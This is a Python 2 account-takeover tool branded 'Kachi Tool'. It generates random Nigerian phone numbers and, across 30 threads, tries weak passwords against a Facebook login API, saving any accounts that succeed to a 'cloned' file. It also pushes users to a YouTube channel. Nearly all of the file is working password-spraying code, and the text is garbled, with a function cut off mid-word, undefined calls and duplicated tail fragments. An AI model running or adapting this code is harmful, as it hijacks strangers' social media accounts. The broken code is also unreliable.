
#!/usr/bin/python2
#coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(20000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 NaijaClone.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 10; TECNO KD7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 10; TECNO KD7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30"')]


def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\033[1;33;40mPlease Wait \033[1;33;40m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

print """
\033[1;35;40m     
██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗
██║ ██╔╝██╔══██╗██╔════╝██║  ██║██║
█████╔╝ ███████║██║     ███████║██║
██╔═██╗ ██╔══██║██║     ██╔══██║██║
██║  ██╗██║  ██║╚██████╗██║  ██║██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝
                                              
                                              
                                              
\033[1;91m   ╔═══════════════════════════════════════════╗
\033[1;31;40m   |                                           |
\033[1;31;40m   |Author: KACHI                 |
\033[1;31;40m   |                                           |
\033[1;31;40m   |Github: https://github.com/Kachi077|
\033[1;31;40m   |                                           |
\033[1;31;40m   |Youtube: Tech Kachi           |
\033[1;31;40m   |                                           |
\033[1;91m   ╚═══════════════════════════════════════════╝    
"""

logo1 = """
\033[1;32;40m        
██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗
██║ ██╔╝██╔══██╗██╔════╝██║  ██║██║
█████╔╝ ███████║██║     ███████║██║
██╔═██╗ ██╔══██║██║     ██╔══██║██║
██║  ██╗██║  ██║╚██████╗██║  ██║██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      
"""
logo= """
\033[1;33;40m              
██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗
██║ ██╔╝██╔══██╗██╔════╝██║  ██║██║
█████╔╝ ███████║██║     ███████║██║
██╔═██╗ ██╔══██║██║     ██╔══██║██║
██║  ██╗██║  ██║╚██████╗██║  ██║██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝
"""
CorrectCodeWord ='KACHILEE'
print '   \033[1;33;40m[🔒🔒🔒] CodeWord Required To Enter [🔒🔒🔒]'
loop = 'true'
while loop == 'true':
    CodeWord = raw_input('\033[1;32;40m@KACHI@\033[1;31;40m] \x1b[1;91m[🔐] Enter CodeWord\x1b[1;97m: ')
    if (CodeWord == CorrectCodeWord):
        print('\n            \x1b[1;92m🔓🔓🔓 Correct Entry 🔓🔓🔓 \n                  ')
        jalan('    \x1b[1;97m•◈•◈•◈•◈• Welcome To Kachi Tool •◈•◈•◈•◈•')
        loop = 'false'
    else:
        print '\x1b[1;91mWrong Entry!'
        os.system('xdg-open https://youtube.com/channel/UChu4JXNc76gLueRN33KWwtA')

def lisensi():
    os.system('clear')
    login()
def login():
    print logo
    os.system('clear')
    print logo
    print "\033[1;32;40m🙄KACHI🙄\033[1;31;40m] \033[1;31;40m[1] First Subscribe My Channel"
    print "\033[1;32;40m🙄KACHI🙄\033[1;31;40m] \033[1;31;40m[0] Exit"
    pilih_login()
def pilih_login():
    peak = raw_input('\n\x1b[1;91m[\x1b[1;91m🙄KACHI🙄\033[1;91m] \033[1;31;40m[◈] \033[1;31;40mChoose an Option:\x1b[1;98m')
    if peak == '':
        print '\x1b[1;91mFill In Correctly'
        pilih_login()
    elif peak == '1':
        os.system('xdg-open https://youtube.com/channel/UChu4JXNc76gLueRN33KWwtA')
        login1()
    elif peak == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] Invalid Option'
        keluar()

def login1():
    os.system('clear')
    print logo
    print '\033[1;32;40m🙄KACHI🙄\033[1;31;40m] \033[1;33;40m[1]\033[1;33;40mClone Bangla FB Accounts.'
    print "\033[1;32;40m🙄KACHI🙄\033[1;31;40m] \033[1;31;40m[2] Subscribe My Channel"
    print '\033[1;32;40m🙄KACHI🙄\033[1;31;40m] \033[1;33;40m[0]\033[1;33;40m Exit The Program.'
    pilih_login1()


def pilih_login1():
    peak = raw_input('\n\x1b[1;91m[\x1b[1;91m@KACHI@\033[1;91m] \033[1;31;40m[◈] \033[1;31;40mChoose an Option:\x1b[1;98m')
    if peak == '':
        print '\x1b[1;91mFill In Correctly'
        pilih_login1()
    elif peak == '1':
        Zk()
    elif peak == '2':
        os.system('xdg-open https://youtube.com/channel/UChu4JXNc76gLueRN33KWwtA')
        login1()
    elif peak == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] Invalid Option'
        pilih_login1()


def Zk():
    os.system('clear')
    print logo1
    print '\033[1;32;40m@KACHI@\033[1;31;40m] \033[1;33;40m[1]\033[1;33;40m Start The Process'
    time.sleep(0.05)
    print '\033[1;32;40m@KACHI@\033[1;31;40m] \033[1;33;40m[0]\033[1;33;40m Go Back To The Previous Menu'
    time.sleep(0.05)
    pilih_Zk()


def pilih_Zk():
    peak = raw_input('\n\x1b[1;91m[\x1b[1;91m@KACHI@\033[1;91m] \033[1;31;40m[◈] \033[1;31;40mChoose an Option:\x1b[1;98m')
    if peak == '':
        pri
    global cpb
    global oks
    os.system('clear')
    print logo1
    print '\033[1;33;40mAvailable Area Codes:'
    print 50 * '\033[1;94m_'
    print '             \x1b[1;97m88,41,53,89,83,52'
    print '             \x1b[1;97m33,44,66,59,76,85'
    print '             \x1b[1;97m30,55,86,82,69,70,9'
    print 50 * '\033[1;94m_'
    try:
        c = raw_input('\n\033[1;33;40m[\x1b[1;91m@KACHI@\033[1;31;40m] \033[1;33;40m[◈] \033[1;33;40mChoose Area Code:\x1b[1;98m')
        k = '+234'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Back ]')
        Trypass()

    print 50 * '\033[1;95m◈'
    print '\x1b[1;37;40m◈◈◈◈◈◈◈◈ Cloning Process Has Been Started ◈◈◈◈◈◈◈◈'
    print '\x1b[1;37;40m◈◈◈◈◈◈◈◈ To Stop The Process Press CTRl+Z ◈◈◈◈◈◈◈◈'
    xxx = str(len(id))
    jalan('[✅] \x1b[1;97mTotal Numbers: ' + xxx)
    jalan('\x1b[1;97m[✅] \x1b[1;97mTrying Passwords Wait...')
    print 50 * '\033[1;31;40m◈'
    print '\033[1;31;40m◈◈◈◈◈◈◈◈◈◈◈ Developed By Kachi ◈◈◈◈◈◈◈◈◈◈◈ '

    def main(arg):
        user = arg
        try:
            os.mkdir('cloned')
        except OSError:
            pass

        try:
            pass1 = '223344'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Kachi-Ok]    ' + k + c + user + '  \x1b[1;97m|  ' + pass1
                okb = open('cloned/idz.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\033[1;31;40m[In-Active] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass1
                cps = open('cloned/idz.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[Kachi-Ok]    ' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    okb = open('cloned/idz.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\033[1;31;40m[In-Active] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    cps = open('cloned/idz.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)

        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\033[1;31;40m'
    print '\033[1;31;40m◈◈◈◈◈◈◈◈◈◈◈ Developed By Kachi ◈◈◈◈◈◈◈◈◈◈◈ '
    print '[✅] Process Has Been Completed ...'
    print '[✅] Total Active/In-Active : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[✅] Cloned Accounts Has Been Saved : cloned/idz.txt'
    jalan('\x1b[1;96mInstruction:')
    jalan('\x1b[1;97mKachi-CP Accounts Will Open Between 7-15 Days')
    jalan('\x1b[1;96mKACHI')
    raw_input('\n\x1b[1;94m[\x1b[1;91mBack\033[1;31;40m]')
    login()


def own():
    os.system('clear')
    print logo1
    print '\033[1;33;40mAvailable Area Codes:'
    print 50 * '\033[1;94m_'
    print '             \x1b[1;97m88,41,53,89,83,52'
    print '             \x1b[1;97m33,44,66,59,75,85'
    print '             \x1b[1;97m30,55,86,82,69,70,9'
    print 50 * '\033[1;94m_'
    print 50 * '\033[1;94m_'
    try:
        c = raw_input('\n\033[1;32;40m@KACHI@\033[1;31;40m] \033[1;33;40m[◈] \033[1;33;40mChoose Area Code:\x1b[1;98m')
        pass1 = raw_input('\033[1;32;40m🙄KACHI🙄\033[1;31;40m] \033[1;33;40m[◈] \x1b[1;97mEnter Your Password: \x1b[1;97m')
        k = '+234'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Back ]')
        passmenu()

    print 50 * '\033[1;95m◈'
    print '\x1b[1;37;40m◈◈◈◈◈◈◈◈ Cloning Process Has Been Started ◈◈◈◈◈◈◈◈'
    print '\x1b[1;37;40m◈◈◈◈◈◈◈◈ To Stop The Process Press CTRl+Z ◈◈◈◈◈◈◈◈'
    xxx = str(len(id))
    jalan('\033[1;36;40m[✅] \x1b[1;97mTotal Numbers: ' + xxx)
    jalan('\033[1;36;40m[✅] \x1b[1;97mTrying Your Password Wait...')
    print 50 * '\033[1;31;40m◈'
    print '\033[1;31;40m◈◈◈◈◈◈◈◈◈◈◈ Developed By Kachi ◈◈◈◈◈◈◈◈◈◈◈ '

    def main(arg):
        user = arg
        try:
            os.mkdir('cloned')
        except OSError:
            pass

        try:
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Kachi-Ok]    ' + k + c + user + ' \x1b[1;97m|  ' + pass1
                okb = open('cloned/idz.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\033[1;31;40m[In-Active] \x1b[1;97m' + k + c + user + ' \x1b[1;97m|  ' + pass1
                cps = open('cloned/idz.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\033[1;31;40m'
    print '\033[1;31;40m◈◈◈◈◈◈◈◈◈◈◈ Developed By Kachi ◈◈◈◈◈◈◈◈◈◈◈ '
    print '[✅] Process Has Been Completed ...'
    print '[✅] Total Active/In-Active : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[✅] Cloned Accounts Has Been Saved : cloned/idz.txt'
    jalan('\x1b[1;96mInstruction:')
    jalan('\x1b[1;97mKachi-CP Accounts Will Open Between 7-15 Days')
    jalan('\x1b[1;96mKachi')
    raw_input('\n\x1b[1;94m[\x1b[1;91mBack\033[1;31;40m]')
    own()
if __name__ == '__main__':
    login()
    jalan('\x1b[1;96mInstruction:')
    jalan('\x1b[1;97mIn-Active [\x1b[1;91mBack\033[1;31;40m]')
    own()
if __name__ == '__main__':
    login()
          txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\033[1;31;40m'
    print '\033[1;31;40m◈◈◈◈◈◈◈◈◈◈◈ Developed By Kachi ◈◈◈◈◈◈◈◈◈◈◈ '
    print '[✅] Process Has Been Completed ...'
    print '[✅] Total Active/In-Active : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[✅] Cloned Accounts Has Been Saved : cloned/idz.txt'
    jalan('\x1b[1;96mInstruction:')
    jalan('\x1b[1;97mKachi-CP Accounts Will Open Between 7-15 Days')
    jalan('\x1b[1;96mKachi')
    raw_input('\n\x1b[1;94m[\x1b[1;91mBack\033[1;31;40m]')
    own()
if __name__ == '__main__':
    login()
    jalan('\x1b[1;96mInstruction:')
    jalan('\x1b[1;97mKachi-CP Accounts Will Open Between 7-15 Days')
    jalan('\x1b[1;96mKachi')
    raw_input('\n\x1b[1;94m[\x1b[1;91mBack\033[1;31;40m]')
    own()
if __name__ == '__main__':
    login()
      